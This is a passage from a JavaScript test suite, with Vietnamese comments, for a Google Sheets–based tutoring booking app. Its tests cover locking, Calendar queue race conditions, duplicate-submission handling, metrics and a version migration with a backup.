  // Ô bị Sheets đổi thành giờ vẫn đúng sau khi đi qua bộ đệm
  cfgSet(c, 'BOOKING_CUTOFF_TIME_TEST', '');
  const j = cv.findIndex(r => r[0] === 'SCHOOL_NAME'); cv[j][1] = new Date(1899, 11, 30, 8, 0);
  api.clearConfigCache_(); api.cfg_('SCHOOL_NAME'); api.clearConfigMemory_();
  assert.strictEqual(api.cfg_('SCHOOL_NAME'), '08:00', 'ô kiểu giờ qua bộ đệm vẫn là 08:00');
});

t('I71', 'Chống ghi nhầm dòng: admin sắp xếp tab BOOKINGS đúng lúc ghi thì vẫn ghi đúng buổi; ai đó gõ thêm dòng ở cuối thì dòng mới ghi sau, không đè', () => {
  const c = mk(), { api } = c;
  const r = c.book('S003', [[K(13, 10), '19:00'], [K(14, 10), '19:00']]);
  const [a, b] = r.map(x => x.bookingId);
  api.withLock_(() => {
    const t = api.table_('BOOKINGS'), ra = t.byId(a), rb = t.byId(b), v = RAW(c, 'BOOKINGS');
    const tmp = v[ra._row - 1]; v[ra._row - 1] = v[rb._row - 1]; v[rb._row - 1] = tmp;   // admin bấm sắp xếp
    t.update(ra, { admin_note: 'ghi cho ' + a });
  });
  assert.strictEqual(c.row('BOOKINGS', a).admin_note, 'ghi cho ' + a);
  assert.strictEqual(c.row('BOOKINGS', b).admin_note, '', 'không ghi nhầm sang buổi khác');
  const v = RAW(c, 'BOOKINGS'), manual = api.SCHEMA.BOOKINGS.cols.map(col => col === 'admin_note' ? 'dòng gõ tay' : '');
  api.withLock_(() => {
    api.table_('BOOKINGS');
    v.push(manual.slice());   // gõ tay trong lúc lượt này giữ khoá
    api.logActivity_('t', 'x', '', '', '');
    api.table_('BOOKINGS').insert({ booking_id: 'BK999999', student_id: 'S003', tutor_id: 'T001', date: new Date(2026, 9, 20), slot: '19:00', status: 'CANCELLED_ADMIN' });
  });
  const all = c.rows('BOOKINGS');
  assert.ok(all.some(x => x.admin_note === 'dòng gõ tay'), 'dòng gõ tay còn nguyên');
  assert.ok(all.some(x => x.booking_id === 'BK999999'));
});

t('I72', 'Đối soát mỗi giờ: hai học viên cùng một tutor cùng giờ thì báo Khẩn 1 lần mỗi ngày; buổi trong 3 giờ tới chưa có sự kiện thì báo và giục hàng đợi', () => {
  const c = mk(), { api, env } = c;
  const r = c.book('S003', [[K(13, 10), '19:00']])[0];
  const b = c.row('BOOKINGS', r.bookingId);
  api.withLock_(() => api.table_('BOOKINGS').insert({ booking_id: 'BK900001', student_id: 'S005', tutor_id: b.tutor_id, sp_id: 'SP00005', date: b.date, slot: '19:00', status: 'CONFIRMED', created_at: new Date(), cal_state: 'CREATED', event_id: 'x' }));
  api.hourlyJob(); api.hourlyJob();
  const inv = c.rows('NOTIFICATIONS').filter(n => n.event === 'DATA_INVARIANT');
  assert.strictEqual(inv.length, 1); assert.strictEqual(inv[0].level, 'CRITICAL');
  assert.ok(/BK900001/.test(inv[0].message));
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  api.withLock_(() => api.table_('BOOKINGS').insert({ booking_id: 'BK900002', student_id: 'S007', tutor_id: 'T004', sp_id: 'SP00007', date: new Date(2026, 9, 12), slot: '12:00', status: 'CONFIRMED', created_at: new Date() }));
  env.state.cache.cal_due_at = String(Date.now() + 99e6);
  api.hourlyJob();
  const late = c.rows('NOTIFICATIONS').filter(n => n.event === 'CALENDAR_LATE');
  assert.ok(late.length === 1 && /BK900002/.test(late[0].message));
  assert.ok(Number(env.state.cache.cal_due_at) <= api.getNow_().getTime(), 'hàng đợi chạy ngay lần tới');
  const q = api.calendarJob();
  assert.ok(q.created >= 1 && c.row('BOOKINGS', 'BK900002').event_id, 'đường gấp tạo sự kiện');
});

t('I73', 'Số đo: mỗi lượt API cộng vào bộ đệm theo giờ; job mỗi giờ chép giờ trước sang tab METRICS một lần; trang health trả OK mà không mở Sheets', () => {
  const c = mk(), { api, env } = c;
  const tok = tokenFor(c, 'S003');
  for (let i = 0; i < 3; i++) api.apiStudentHome(tok);
  const row = api.metricsNow_().find(x => x.fn === 'apiStudentHome');
  assert.ok(row && row.count === 3, JSON.stringify(row));
  assert.ok(api.metricsNow_().some(x => x.fn === '_lock_hold'), 'đo cả thời gian giữ khoá');
  const realNow = Date.now;
  Date.now = () => realNow() + 3700e3;
  try { api.hourlyJob(); api.hourlyJob(); } finally { Date.now = realNow; }
  const m = c.rows('METRICS').filter(x => x.fn === 'apiStudentHome');
  assert.strictEqual(m.length, 1, 'mỗi giờ 1 dòng'); assert.strictEqual(Number(m[0].count), 3);
  assert.ok(Number(m[0].p95_ms) >= Number(m[0].p50_ms));
  const spy = spyOpen(c); api.clearDbCache_();
  const h = api.doGet({ parameter: { page: 'health' } }).getContent();
  spy.restore();
  assert.strictEqual(h, 'OK', 'health chỉ trả OK'); assert.strictEqual(spy.n, 0, 'health không mở Sheets');
  // Trình duyệt báo lỗi sau khi thử lại: chỉ cộng bộ đệm, không ghi Sheets, không lấy khoá
  const l0 = env.state.lockCalls, s2 = spyOpen(c); api.clearDbCache_();
  assert.strictEqual(api.apiClientReport('hack', 5).ok, false);
  assert.ok(api.apiClientReport('fail', 2).ok);
  s2.restore();
  assert.strictEqual(env.state.lockCalls, l0); assert.strictEqual(s2.n, 0);
  assert.strictEqual(api.metricsNow_().find(x => x.fn === '_client_fail').count, 2);
});

t('I74', 'Tutor xác nhận nhiều buổi một lần: một lần lấy khoá, buổi sai hoặc của tutor khác báo riêng từng buổi, gửi lại cùng mã không ghi 2 lần', () => {
  const c = mk(), { api, env } = c;
  c.onlyOpen(K(13, 10), '19:00', ['T002']); c.onlyOpen(K(13, 10), '20:00', ['T002']); c.onlyOpen(K(14, 10), '19:00', ['T003']);
  const a = c.book('S003', [[K(13, 10), '19:00']])[0], b = c.book('S005', [[K(13, 10), '20:00']])[0], o = c.book('S007', [[K(14, 10), '19:00']])[0];
  c.at('2026-10-14 21:00');
  const tok = tokenFor(c, 'T002'), l0 = env.state.lockCalls;
  const r = api.apiTutorSubmitResults(tok, [{ bookingId: a.bookingId, result: 'COMPLETED' }, { bookingId: b.bookingId, result: 'STUDENT_ABSENT' }, { bookingId: o.bookingId, result: 'COMPLETED' }, { bookingId: 'BK000999', result: 'COMPLETED' }], 'rid_res_00001');
  assert.ok(r.ok, JSON.stringify(r)); assert.strictEqual(r.data.saved, 2);
  assert.deepStrictEqual(r.data.items.map(x => x.reason), ['OK', 'OK', 'FORBIDDEN', 'NOT_FOUND']);
  assert.ok(env.state.lockCalls - l0 <= 2, 'lần lấy khoá: ' + (env.state.lockCalls - l0));
  assert.strictEqual(c.row('BOOKINGS', a.bookingId).status, 'COMPLETED'); assert.strictEqual(c.row('BOOKINGS', b.bookingId).status, 'STUDENT_ABSENT');
  const logs = c.rows('ACTIVITY_LOG').filter(l => l.action === 'SESSION_RESULT').length;
  assert.ok(api.apiTutorSubmitResults(tok, [{ bookingId: a.bookingId, result: 'COMPLETED' }], 'rid_res_00001').replay);
  assert.strictEqual(c.rows('ACTIVITY_LOG').filter(l => l.action === 'SESSION_RESULT').length, logs);
  assert.strictEqual(api.apiTutorSubmitResults(tok, [], 'x').reason, 'INVALID_INPUT');
});

t('I75', 'Menu Đo tốc độ: đo từng phần việc với dữ liệu thật, ghi SPEED_TEST; menu Calendar chạy hàng đợi ngay bỏ qua giờ gom', () => {
  const c = mk(), { api } = c;
  const rows = api.speedTest_();
  ['Đọc tab BOOKINGS', 'Slot 14 ngày (không đệm)', 'Cổng tutor: lịch dạy', 'Lấy khoá rồi nhả (không ghi)', 'Hạn mức email còn lại hôm nay'].forEach(l => assert.ok(rows.some(r => r.label === l), l));
  assert.ok(rows.every(r => typeof r.ms === 'number'));
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'SPEED_TEST'));
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  c.book('S003', [[K(13, 10), '19:00']]);
  c.env.state.uiScript = [];
  const r = api.menuCalendarRunNow();
  assert.strictEqual(r.created, 1, 'tạo ngay dù chưa tới 23:00');
  assert.strictEqual(api.calendarQueueStatus_().pending, 0);
});

// ═══ Sửa sau lượt soát R1 (5F) ═══
t('I76', 'Đổi tutor đúng lúc hàng đợi đang tạo sự kiện: sự kiện được vá sang tutor mới ngay (không mời tutor cũ); đổi tutor buổi đã có sự kiện thì vá ngoài khoá, vá lỗi thì hàng đợi vá lại', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  c.onlyOpen(K(14, 10), '19:00', ['T001', 'T002']);
  const r = c.book('S003', [[K(14, 10), '19:00']])[0];
  const first = c.row('BOOKINGS', r.bookingId).tutor_id, other = first === 'T001' ? 'T002' : 'T001';
  const realIns = env.globals.Calendar.Events.insert;
  let once = true;
  env.globals.Calendar.Events.insert = (res, cal, o) => {
    const ev = realIns(res, cal, o);
    if (once) { once = false; api.withLock_(() => { const b = api.table_('BOOKINGS').byId(r.bookingId); api.reassignBookingInLock_(b, [first], 'admin@thaiput.vn', 'ADMIN', other); }); }
    return ev;
  };
  c.at('2026-10-12 23:05'); api.runCalendarQueue_({});
  env.globals.Calendar.Events.insert = realIns;
  const b = c.row('BOOKINGS', r.bookingId);
  assert.strictEqual(b.tutor_id, other); assert.strictEqual(b.cal_state, 'CREATED', b.cal_state);
  const ev = env.state.events[b.event_id], guests = ev.attendees.map(a => a.email);
  assert.ok(guests.indexOf(EMAIL[other]) !== -1 && guests.indexOf(EMAIL[first]) === -1, 'khách mời: ' + guests);
  assert.ok(new RegExp(api.userById_(other).name).test(ev.summary));
  // Đổi tutor khi đã có sự kiện: vá khi không giữ khoá; vá lỗi thì RESYNC và hàng đợi vá lại
  const held = [], realPatch = env.globals.Calendar.Events.patch;
  env.globals.Calendar.Events.patch = (res, cal, id, o) => { held.push(!!env.state.lockHeld); if (env.state.failPatch && o && o.sendUpdates === 'all') { env.state.failPatch = false; throw new Error('Backend Error'); } return realPatch(res, cal, id, o); };
  api.withLock_(() => { const x = api.table_('BOOKINGS').byId(r.bookingId); api.reassignBookingInLock_(x, [other], 'admin@thaiput.vn', 'ADMIN', first); });
  assert.ok(held.length && held.every(h => !h), 'vá Calendar ngoài khoá: ' + held);
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).cal_state, 'CREATED');
  env.state.failPatch = true;
  api.withLock_(() => { const x = api.table_('BOOKINGS').byId(r.bookingId); api.reassignBookingInLock_(x, [first], 'admin@thaiput.vn', 'ADMIN', other); });
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).cal_state, 'RESYNC');
  const q = api.runCalendarQueue_({ force: true });
  assert.strictEqual(q.resynced, 1, JSON.stringify(q));
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).cal_state, 'CREATED');
  assert.ok(env.state.events[b.event_id].attendees.some(a => a.email === EMAIL[other]));
  env.globals.Calendar.Events.patch = realPatch;
});

t('I77', 'Hàng đợi: booking gấp đặt trong lúc job đang chạy không bị xoá gợi ý; huỷ đúng lúc job đang tạo mà lượt ghi cuối của job hỏng thì vẫn gỡ được sự kiện; tutor xác nhận kết quả lúc job tạo thì không gửi thư huỷ', () => {
  const c = mk('2026-10-12 16:00'), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'QUEUE');
  const a = c.book('S003', [[K(14, 10), '19:00']])[0];
  const realIns = env.globals.Calendar.Events.insert;
  let step = 0;
  env.globals.Calendar.Events.insert = (res, cal, o) => {
    const ev = realIns(res, cal, o);
    if (step++ === 0) {
      // Một lượt đặt khác (QUEUE, cần tạo trong vài phút) ghi gợi ý "có việc ngay" trong lúc job đang gọi Google
      api.bookSessionsFor_('S005', [{ date: K(15, 10), slot: '20:00' }], 'admin@thaiput.vn', { override: true });
    }
    return ev;
  };
  api.runCalendarQueue_({ force: true });
  env.globals.Calendar.Events.insert = realIns;
  assert.ok(Number(env.state.cache.cal_due_at) <= api.getNow_().getTime(), 'gợi ý không bị ghi đè: ' + new Date(Number(env.state.cache.cal_due_at)));
  assert.strictEqual(api.calendarJob().created, 1, 'lượt sau tạo ngay buổi vừa đặt');
  // Huỷ trong lúc job tạo, và lượt ghi cuối của job gặp khoá bận
  cfgSet(c, 'CALENDAR_MODE', 'INLINE');
  const b = c.book('S007', [[K(15, 10), '19:00']])[0];
  api.withLock_(() => { const tb = api.table_('BOOKINGS'), x = tb.byId(b.bookingId); tb.update(x, { event_id: '', cal_state: 'PENDING', cal_attempts: 0, cal_next_at: '' }); });
  const evId = api.lessonEventId_(c.row('BOOKINGS', b.bookingId));
  env.state.events[evId].status = 'cancelled'; delete env.state.events[evId];   // sự kiện cũ không còn
  env.globals.Calendar.Events.insert = (res, cal, o) => { const ev = realIns(res, cal, o); api.cancelBookingFor_('S007', b.bookingId, EMAIL.S007); env.state.lockBusy = true; return ev; };
  const res = (() => { try { return api.runCalendarQueue_({ force: true }); } catch (e) { return { err: e.message }; } })();
  env.state.lockBusy = false; env.globals.Calendar.Events.insert = realIns;
  assert.ok(res.err, 'lượt ghi cuối của job hỏng');
  assert.strictEqual(c.row('BOOKINGS', b.bookingId).cal_state, 'CANCELLED', 'luồng huỷ biết sự kiện có thể đã tạo và gỡ theo mã cố định');
  assert.strictEqual(env.state.events[evId].status, 'cancelled');
  // Tutor xác nhận kết quả đúng lúc job tạo: giữ sự kiện, không thư huỷ
  c.at('2026-10-16 19:10');
  const d = { bookingId: 'BK900010' };
  api.withLock_(() => api.table_('BOOKINGS').insert({ booking_id: d.bookingId, student_id: 'S008', tutor_id: 'T004', sp_id: 'SP00008', date: new Date(2026, 9, 16), slot: '19:00', status: 'CONFIRMED', created_at: new Date(2026, 9, 12), cal_state: 'PENDING' }));
  const rm0 = c.calls('remove').length;
  env.globals.Calendar.Events.insert = (res2, cal, o) => { const ev = realIns(res2, cal, o); api.withLock_(() => { const tb = api.table_('BOOKINGS'); tb.update(tb.byId(d.bookingId), { status: 'COMPLETED' }); }); return ev; };
  api.runCalendarQueue_({ force: true });
  env.globals.Calendar.Events.insert = realIns;
  assert.strictEqual(c.row('BOOKINGS', d.bookingId).cal_state, 'CREATED'); assert.strictEqual(c.calls('remove').length, rm0, 'không gửi thư huỷ');
});

t('I78', 'Chống gửi trùng: lần gửi lại khi lần đầu còn chạy nhận IN_PROGRESS (không phải "bận"); đổi link rác không ghi gì vào bộ đệm; mã sự kiện không đổi khi Sheets làm tròn mili giây; CONFIG đệm cũ ghi sau khi admin sửa thì bị bỏ', () => {
  const c = mk(), { api, env } = c;
  const tok = tokenFor(c, 'S003');
  let inner = null;
  const realIns = env.globals.Calendar.Events.insert;
  env.globals.Calendar.Events.insert = (res, cal, o) => { if (!inner) inner = api.apiStudentBook(tok, [{ date: K(13, 10), slot: '19:00' }], 'rid_dup_00001'); return realIns(res, cal, o); };
  const outer = api.apiStudentBook(tok, [{ date: K(13, 10), slot: '19:00' }], 'rid_dup_00001');
  env.globals.Calendar.Events.insert = realIns;
  assert.ok(outer.ok && outer.data[0].ok); assert.strictEqual(inner.reason, 'IN_PROGRESS');
  const keys0 = Object.keys(env.state.cache).length;
  for (let i = 0; i < 5; i++) api.apiExchangeToken('ab'.repeat(32), UA_WIN, 'rid_junk_' + i + '0000');
  assert.ok(Object.keys(env.state.cache).length - keys0 <= 1, 'link rác không ghi bộ đệm: ' + (Object.keys(env.state.cache).length - keys0));
  const b = c.row('BOOKINGS', outer.data[0].bookingId), ms = new Date(b.created_at.getTime()); ms.setMilliseconds(789);
  const s0 = new Date(ms.getTime()); s0.setMilliseconds(0);
  assert.strictEqual(api.lessonEventId_(Object.assign({}, b, { created_at: ms })), api.lessonEventId_(Object.assign({}, b, { created_at: s0 })));
  // CONFIG: lượt A đọc tab (cũ), admin sửa (onEdit), A ghi đệm bản cũ => lần đọc sau không dùng bản cũ đó
  api.clearConfigCache_();
  const cv = RAW(c, 'CONFIG'); let i = cv.findIndex(r => r[0] === 'SCHOOL_NAME'); if (i === -1) { cv.push(['SCHOOL_NAME', 'thaiput', '']); i = cv.length - 1; }
  let edited = false;
  const origOpen = env.globals.SpreadsheetApp.openById;
  // Lượt A đọc xong tab (giá trị cũ) thì admin sửa và onEdit xoá đệm, TRƯỚC khi A kịp ghi bản cũ vào đệm
  env.globals.SpreadsheetApp.openById = (id) => {
    const ss = origOpen(id);
    return Object.assign({}, ss, { getSheetByName: (n) => {
      const sh = ss.getSheetByName(n);
      if (n !== 'CONFIG' || edited) return sh;
      return Object.assign({}, sh, { getDataRange: () => ({ getValues: () => { const v = JSON.parse(JSON.stringify(sh.getDataRange().getValues())); edited = true; cv[i][1] = 'Mới'; api.dropConfigCache_(); return v; } }) });
    } });
  };
  api.clearConfigMemory_(); api.clearDbCache_();   // lần chạy mới (5I: file DB mở một lần mỗi lần chạy, dùng chung cho CONFIG)
  assert.strictEqual(api.cfg_('SCHOOL_NAME'), 'thaiput', 'lượt A đọc bản cũ');
  env.globals.SpreadsheetApp.openById = origOpen;
  api.clearConfigMemory_(); api.clearDbCache_();
  assert.strictEqual(api.cfg_('SCHOOL_NAME'), 'Mới', 'không dùng bản đệm cũ');
});

// ═══ Sửa sau lượt soát R2 (5F) ═══
t('I79', 'Đăng nhập tutor: gửi lại cùng mã trong lúc lượt đầu đang gửi email "Có đăng nhập mới" nhận IN_PROGRESS rồi đúng phiên (không "link đã dùng"); email gửi sau khi kết quả đã lưu', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'NEW_LOGIN_EMAIL_ROLES', 'ADMIN,TUTOR');   // 16/10: mặc định chỉ admin; bật cho tutor để thử cơ chế gửi sau khi lưu
  const link = linkFor(c, 'T002'), realMail = env.globals.GmailApp.sendEmail;
  let inner = null;
  // Lần gửi lại tới đúng lúc lượt đầu đang chờ khoá (đã qua bước kiểm link): phải nhận IN_PROGRESS, không "link đã dùng"
  const LS = env.globals.LockService, realGet = LS.getScriptLock; let early = null;
  LS.getScriptLock = () => { const l = realGet(); const rt = l.tryLock; return Object.assign({}, l, { tryLock: (ms) => { if (early === null) { early = 'pending'; early = api.apiExchangeToken(link, UA_WIN, 'rid_tlog_0001'); } return rt(ms); } }); };
  const first = api.apiExchangeToken(link, UA_WIN, 'rid_tlog_0001');
  LS.getScriptLock = realGet;
  assert.ok(first.ok); assert.strictEqual(early.reason, 'IN_PROGRESS', JSON.stringify(early));
  env.state.cache = {};
  const link2 = linkFor(c, 'T002');
  env.globals.GmailApp.sendEmail = (...a) => { if (!inner && /đăng nhập|sign in/i.test(a[1])) inner = api.apiExchangeToken(link2, UA_WIN, 'rid_tlog_0002'); return realMail(...a); };
  const outer = api.apiExchangeToken(link2, UA_WIN, 'rid_tlog_0002');
  env.globals.GmailApp.sendEmail = realMail;
  assert.ok(outer.ok, JSON.stringify(outer));
  assert.ok(inner && inner.ok && inner.replay && inner.data.sessionToken === outer.data.sessionToken, 'lần gửi lại nhận đúng phiên: ' + JSON.stringify(inner));
});

t('I80', 'Hàng đợi: khoá bận đúng lúc đánh dấu thì giữ chỗ được gỡ, lượt 5 phút sau làm tiếp (không trễ 24 giờ); cả lô lỗi thì báo Khẩn ngay 1 lần; sau 00:00 có tổng kết lô đêm', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  const r = c.book('S003', [[K(14, 10), '19:00']])[0];
  c.book('S005', [[K(14, 10), '20:00']]); c.book('S007', [[K(15, 10), '19:00']]);
  c.at('2026-10-12 23:00');
  env.state.lockBusy = true;
  let busy = null; try { api.runCalendarQueue_({}); } catch (e) { busy = e.message; }
  env.state.lockBusy = false;
  assert.ok(busy, 'khoá bận');
  assert.ok(!Object.keys(env.state.cache).some(k => /^cal_lease_/.test(k)), 'giữ chỗ đã gỡ');
  c.at('2026-10-12 23:05');
  env.state.calendarFailNext = 3;
  const f = api.runCalendarQueue_({});
  assert.strictEqual(f.failed, 3, JSON.stringify(f));
  const bf = c.rows('NOTIFICATIONS').filter(n => n.event === 'CALENDAR_BATCH_FAILED');
  assert.strictEqual(bf.length, 1); assert.strictEqual(bf[0].level, 'CRITICAL');
  const b1 = c.row('BOOKINGS', r.bookingId);
  assert.strictEqual(new Date(b1.cal_next_at).getTime(), new Date(2026, 9, 12, 23, 10).getTime(), 'NIGHTLY thử lại sau 5 phút, trong cùng đêm');
  c.at('2026-10-12 23:10'); const ok = api.runCalendarQueue_({});
  assert.strictEqual(ok.created, 3, JSON.stringify(ok));
  c.at('2026-10-13 00:20'); api.hourlyJob();
  const sum = c.rows('NOTIFICATIONS').filter(n => /^CALENDAR_NIGHTLY/.test(n.event));
  assert.strictEqual(sum.length, 1, 'một tổng kết'); assert.ok(/tạo 3 sự kiện/.test(sum[0].message) && /lỗi \(đã thử lại\) 3/.test(sum[0].message), sum[0].message);
  api.hourlyJob();
  assert.strictEqual(c.rows('NOTIFICATIONS').filter(n => /^CALENDAR_NIGHTLY/.test(n.event)).length, 1, 'không gửi lại');
});

t('I81', 'Đối soát gộp: 3 buổi trễ Calendar thì 3 dòng thông báo nhưng 1 email; buổi admin đã dán link Meet tay không bị báo; câu chữ theo trạng thái', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  const ins = (id, sid, tid, slot, extra) => api.withLock_(() => api.table_('BOOKINGS').insert(Object.assign({ booking_id: id, student_id: sid, tutor_id: tid, sp_id: 'SP0000' + sid.slice(-1), date: new Date(2026, 9, 12), slot, status: 'CONFIRMED', created_at: new Date(2026, 9, 11) }, extra || {})));
  ins('BK900101', 'S003', 'T001', '12:00', { cal_state: 'PENDING' }); ins('BK900102', 'S005', 'T002', '12:00', { cal_state: 'FAILED' }); ins('BK900103', 'S007', 'T003', '12:30', { cal_state: 'PENDING' });
  ins('BK900104', 'S008', 'T004', '12:00', { cal_state: 'FAILED', meet_link: 'https://meet.google.com/tay-abc' });
  const m0 = c.mailsTo(EMAIL.ADMIN).length;
  api.hourlyJob();
  const late = c.rows('NOTIFICATIONS').filter(n => n.event === 'CALENDAR_LATE');
  assert.deepStrictEqual(late.map(n => n.entity_id).sort(), ['BK900101', 'BK900102', 'BK900103']);
  const mails = c.mailsTo(EMAIL.ADMIN).slice(m0);
  assert.strictEqual(mails.length, 1, 'một email gộp: ' + mails.map(m => m.subject).join(' | '));
  assert.ok(/BK900102[^;]*gửi link Meet tay/.test(mails[0].htmlBody) && /BK900101[^;]*đang thử lại/.test(mails[0].htmlBody));
});

t('I82', 'METRICS ghi thêm không đọc cả tab, dòng cũ vào lưu trữ (5K); apiClientReport giới hạn 2.000 lượt mỗi giờ; email xác nhận NIGHTLY ghi giờ dự kiến của thư mời; booking cùng mã sau khi xoá dữ liệu không nhận sự kiện của buổi cũ', () => {
  const c = mk(), { api, env } = c;
  const sh = env.state.spreadsheets.DB_STAGING_TEST.sheets.METRICS;
  for (let i = 0; i < 5; i++) sh.values.push([new Date(2026, 0, 1), 'old', 1, 1, 1, 1, 0, 0, '']);
  api.apiPublicInfo();
  const origOpen = env.globals.SpreadsheetApp.openById; let fullReads = 0;
  env.globals.SpreadsheetApp.openById = (id) => { const ss = origOpen(id); return Object.assign({}, ss, { getSheetByName: (n) => { const shx = ss.getSheetByName(n); return n !== 'METRICS' || !shx ? shx : Object.assign({}, shx, { getDataRange: () => { fullReads++; return shx.getDataRange(); } }); } }); };
  const realNow = Date.now; Date.now = () => realNow() + 3700e3;
  try { api.clearDbCache_(); assert.ok(api.withLock_(() => api.flushMetricsInLock_()) >= 1); } finally { Date.now = realNow; env.globals.SpreadsheetApp.openById = origOpen; }
  assert.strictEqual(fullReads, 0, 'ghi METRICS không đọc cả tab');
  // 5K: METRICS không xoá 90 ngày nữa mà chuyển sang file lưu trữ như nhật ký
  const elm = api.archiveEligible_('METRICS', api.table_('METRICS').all(), { cut: api.archiveCutoffs_(api.getNow_()), sps: {} });
  assert.strictEqual(elm.length, 5, 'METRICS cũ đủ điều kiện lưu trữ');
  for (let i = 0; i < 45; i++) api.apiClientReport('fail', 50);
  assert.ok(api.metricsNow_().find(x => x.fn === '_client_fail').count <= 2000);
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  c.book('S003', [[K(14, 10), '19:00']]);
  const mail = c.mailsTo(EMAIL.S003).slice(-1)[0];
  assert.ok(/khoảng 23:0\d 12\/10/.test(mail.htmlBody), 'giờ thư mời dự kiến');
  const tok = tokenFor(c, 'S003');
  assert.ok(/23:0\d 12\/10/.test(api.apiStudentHome(tok).data.upcoming[0].inviteWhen));
  // Booking BK cũ đang được job tạo; dữ liệu bị xoá và mã được dùng lại cho buổi khác
  const r = c.row('BOOKINGS', c.rows('BOOKINGS').find(b => b.student_id === 'S003').booking_id);
  const realIns = env.globals.Calendar.Events.insert;
  env.globals.Calendar.Events.insert = (res, cal, o) => { const ev = realIns(res, cal, o); api.withLock_(() => { const tb = api.table_('BOOKINGS'), x = tb.byId(r.booking_id); tb.update(x, { created_at: new Date(2026, 9, 12, 10, 30), date: new Date(2026, 9, 20), cal_attempts: 0, cal_next_at: '' }); }); return ev; };
  c.at('2026-10-12 23:05'); api.runCalendarQueue_({});
  env.globals.Calendar.Events.insert = realIns;
  const after = c.row('BOOKINGS', r.booking_id);
  assert.strictEqual(after.event_id, '', 'không gắn sự kiện của buổi cũ');
  assert.ok(c.calls('remove').length >= 1, 'gỡ sự kiện vừa tạo');
});

// ═══ Chunk 5G: quyết định 16/10, lưu trữ, bảo trì, phát hành, thử tải ═══
t('I83', 'Menu 1 sau 16/10: CALENDAR_MODE NIGHTLY cũ thành QUEUE, phiên tutor 90 thành 30, mẫu email cũ đổi; chỉ 1 lần (admin chọn lại thì giữ); phiên bản đổi thì sao lưu DB vào Releases trước, ghi RELEASE', () => {
  const { api, env } = freshEnv();
  api.setupFirstRun(); api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('CALENDAR_MODE'), 'QUEUE'); assert.strictEqual(api.cfg_('TUTOR_SESSION_DAYS'), 30);
  assert.strictEqual(api.cfg_('NEW_LOGIN_EMAIL_ROLES'), 'ADMIN');
  const relFolder = env.state.props.RELEASES_FOLDER_ID;
  assert.ok(!relFolder, 'file mới tinh: không cần sao lưu');
  assert.strictEqual(env.state.props.APP_VERSION_LAST, api.APP.VERSION);
  // Giả lập file đang chạy bản 5F: giá trị cũ, mẫu email cũ, phiên bản cũ
  delete env.state.props.MIG_1610; env.state.props.APP_VERSION_LAST = '8.0.7';
  const old = 'Chào {{name}},\n\nTài khoản của bạn vừa đăng nhập lúc **{{time}}** trên **{{device}}** (bằng {{via}}).\n\nNếu đó là bạn, không cần làm gì. Nếu không phải bạn: mở trang, vào mục Tài khoản, bấm **Thoát mọi thiết bị**, rồi nhắn Zalo admin.\n\n{{button:portal_url|Mở trang}}';
  api.withLock_(() => { const t = api.table_('CONFIG'); t.update(t.byId('CALENDAR_MODE'), { value: 'NIGHTLY' }); t.update(t.byId('TUTOR_SESSION_DAYS'), { value: '90' });
    const e = api.table_('EMAIL_TEMPLATES'); e.update(e.byId('STAFF_NEW_LOGIN'), { body_vi: old, body_en: 'If not: open the portal, go to Account, tap **Log out of all devices**, then message admin on Zalo.' }); });
  // Phiên tutor 90 ngày đã cấp, dòng CONTENT cũ của mục thiết bị
  api.addTutor_({ name: 'Vân', email: 'van@tutor.test', phone: '0901000001' }, 'ADMIN');
  api.withLock_(() => { api.table_('AUTH').insert({ token_hash: 'tutor90', user_id: 'T001', kind: 'SESSION', created_at: api.getNow_(), expires_at: new Date(api.getNow_().getTime() + 90 * 86400000) });
    api.table_('CONTENT').insert({ key: 's.devices_title', value: 'Thiết bị đang đăng nhập', default_value: '', note: '' }); });
  const nFiles = Object.keys(env.state.drive.files).length;
  const r = api.setupFirstRun(); api.clearDbCache_(); api.clearConfigCache_();
  const ts90 = api.table_('AUTH').byId('tutor90');
  assert.strictEqual(Math.round((new Date(ts90.expires_at) - new Date(ts90.created_at)) / 86400000), 30, 'phiên tutor cũ rút về 30 ngày');
  assert.ok(!api.table_('CONTENT').byId('s.devices_title'), 'xoá dòng CONTENT đã bỏ');
  assert.strictEqual(api.cfg_('CALENDAR_MODE'), 'QUEUE'); assert.strictEqual(api.cfg_('TUTOR_SESSION_DAYS'), 30);
  assert.ok(!/Thoát mọi thiết bị/.test(api.table_('EMAIL_TEMPLATES').byId('STAFF_NEW_LOGIN').body_vi), 'mẫu email đổi');
  assert.ok(r.lines.some(l => /Sao lưu trước cập nhật \(8\.0\.7 sang/.test(l)), r.lines.join('\n'));
  const copies = Object.values(env.state.drive.files).filter(f => /_TRUOC_/.test(f.name));
  assert.strictEqual(copies.length, 1); assert.strictEqual(copies[0].parent, env.state.props.RELEASES_FOLDER_ID);
  assert.ok(Object.keys(env.state.drive.files).length === nFiles + 1);
  assert.ok(api.table_('ACTIVITY_LOG').all().some(l => l.action === 'RELEASE' && /8\.0\.7/.test(l.detail)));
  // Sao lưu trước cập nhật hỏng: chưa ghi nhận phiên bản, lần sau thử lại
  env.state.props.APP_VERSION_LAST = '8.0.7';
  const realCopy = env.globals.DriveApp.getFileById; env.globals.DriveApp.getFileById = (id) => { const f = realCopy(id); return Object.assign({}, f, { makeCopy: () => { throw new Error('Drive lỗi (giả lập)'); } }); };
  const rf = api.setupFirstRun(); env.globals.DriveApp.getFileById = realCopy;
  assert.ok(rf.lines.some(l => /CẢNH BÁO: chưa sao lưu/.test(l)));
  assert.strictEqual(env.state.props.APP_VERSION_LAST, '8.0.7', 'chưa ghi nhận phiên bản');
  const rg = api.setupFirstRun();
  assert.ok(rg.lines.some(l => /Sao lưu trước cập nhật/.test(l)) && env.state.props.APP_VERSION_LAST === api.APP.VERSION);
